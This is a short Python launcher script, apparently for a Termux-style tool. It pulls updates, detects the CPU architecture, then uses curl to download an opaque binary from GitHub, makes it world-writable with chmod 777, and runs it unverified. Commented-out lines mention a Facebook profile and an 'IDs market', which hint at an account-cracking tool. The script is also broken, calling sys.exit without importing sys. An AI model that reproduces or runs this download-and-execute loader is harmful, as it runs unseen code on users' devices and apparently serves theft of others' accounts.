#utf-8
code_by = '____QXR__'
import os
import subprocess
os.system('git pull')
#os.system('xdg-open https://www.facebook.com/profile.php?id=100094054980090')
#exit(' The tool is closed due to low IDs rate in the market. We will run the tool again after the market stabilizes.')
def download_and_run(url, filename):
    if not os.path.isfile(filename):
        os.system(f'curl -L {url} > {filename}')
        os.system(f'chmod 777 {filename}')
    
    os.system(f'./{filename}')

def main():
    current_os = subprocess.check_output('uname -om', shell=True)
    current_os = str(current_os)

    if 'aarch64' in current_os:
        download_and_run('https://github.com/QXR-Coders/QXR/blob/main/Coders.cpython-311.so/p64', 'p64')
    elif 'arm' in current_os:
        download_and_run('https://github.com/rsaprogrammers/modules_exec/releases/download/Pycrypto/p32', 'p32')
    else:
        print('\n  Unknown device or system found. Please contact the author')
        sys.exit()

if __name__ == '__main__':
    main()
